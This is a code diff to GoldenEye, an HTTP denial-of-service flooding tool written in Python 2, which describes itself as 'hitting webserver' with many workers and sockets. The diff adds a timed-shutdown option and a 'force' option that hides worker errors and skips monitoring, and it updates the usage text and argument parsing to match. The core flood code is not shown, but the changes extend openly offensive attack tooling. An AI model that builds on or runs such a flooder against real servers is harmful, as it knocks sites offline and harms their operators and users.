@@ -159,7 +159,7 @@ class GoldenEye(object):
         print
 
     # Do the fun!
-    def fire(self):
+    def fire(self, time, force):
 
         self.printHeader()
         print "Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(self.method, self.nr_workers, self.nr_sockets)
@@ -179,12 +179,16 @@ class GoldenEye(object):
                 self.workersQueue.append(worker)
                 worker.start()
             except (Exception):
-                error("Failed to start worker {0}".format(i))
-                pass 
+                if force < 1:
+                    error("Failed to start worker {0}".format(i))
+                    pass
 
         if DEBUG:
             print "Initiating monitor"
-        self.monitor()
+
+        time_to_end(time)
+        if force < 1:
+            self.monitor()
 
     def stats(self):
 
@@ -537,6 +541,15 @@ class Striker(Process):
 # Other Functions
 ####
 
+def time_to_end(time):
+    time = int(time)
+    if time > 0:
+        print "Warning! Function self.monitor() turned off, you can recieve errors!"
+        print "{0} seconds to end of script!".format(time)
+        __import__("time").sleep(time)
+        print "Timer ended, shutting down..."
+        os.abort()
+
 def usage():
     print
     print '-----------------------------------------------------------------------------------------------------------'
@@ -552,6 +565,8 @@ def usage():
     print '\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS)
     print '\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)'
     print '\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)'
+    print '\t -t, --time\t\tEnable time to end of script\t\t\t(default: off)'
+    print '\t -f, --force\t\tEnable force\t\t\t(default: off) BETA!'
     print '\t -h, --help\t\tShows this help'
     print
     print '-----------------------------------------------------------------------------------------------------------'
@@ -586,7 +601,7 @@ def main():
         if url == None:
             error("No URL supplied")
 
-        opts, args = getopt.getopt(sys.argv[2:], "dhw:s:m:u:", ["debug", "help", "workers", "sockets", "method", "useragents" ])
+        opts, args = getopt.getopt(sys.argv[2:], "dhw:s:m:t:f:u:", ["debug", "help", "workers", "sockets", "method", "time", "force", "useragents" ])
 
         workers = DEFAULT_WORKERS
         socks = DEFAULT_SOCKETS
@@ -594,6 +609,9 @@ def main():
 
         uas_file = None
         useragents = []
+
+        time = 0
+        force = 0
 
         for o, a in opts:
             if o in ("-h", "--help"):
@@ -605,6 +623,10 @@ def main():
                 socks = int(a)
             elif o in ("-w", "--workers"):
                 workers = int(a)
+            elif o in ("-t", "--time"):
+                time = int(a)
+            elif o in ("-f", "--force"):
+                force = 1
             elif o in ("-d", "--debug"):
                 global DEBUG
                 DEBUG = True
@@ -630,7 +652,7 @@ def main():
         goldeneye.method = method
         goldeneye.nr_sockets = socks
 
-        goldeneye.fire()
+        goldeneye.fire(time, force)
 
     except getopt.GetoptError, err:
 
